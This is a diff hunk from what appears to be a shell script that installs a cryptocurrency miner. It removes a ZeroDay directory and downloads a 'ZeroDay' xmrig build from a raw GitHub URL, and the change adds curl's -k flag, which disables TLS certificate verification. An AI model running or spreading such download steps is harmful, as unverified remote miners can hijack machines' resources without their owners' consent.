@@ -121,7 +121,7 @@ echo "[*] Removing $HOME/ZeroDay directory"
 rm -rf $HOME/ZeroDay
 
 echo "[*] Downloading ZeroDay advanced version of xmrig to /tmp/xmrig.tar.gz"
- if ! curl -L --progress-bar "https://raw.githubusercontent.com/ZeroDayx/x/refs/heads/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
+ if ! curl -k -L --progress-bar "https://raw.githubusercontent.com/ZeroDayx/x/refs/heads/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
   echo "ERROR: Can't download https://raw.githubusercontent.com/ZeroDayx/x/refs/heads/main/xmrig.tar.gz"
   exit 1
 fi
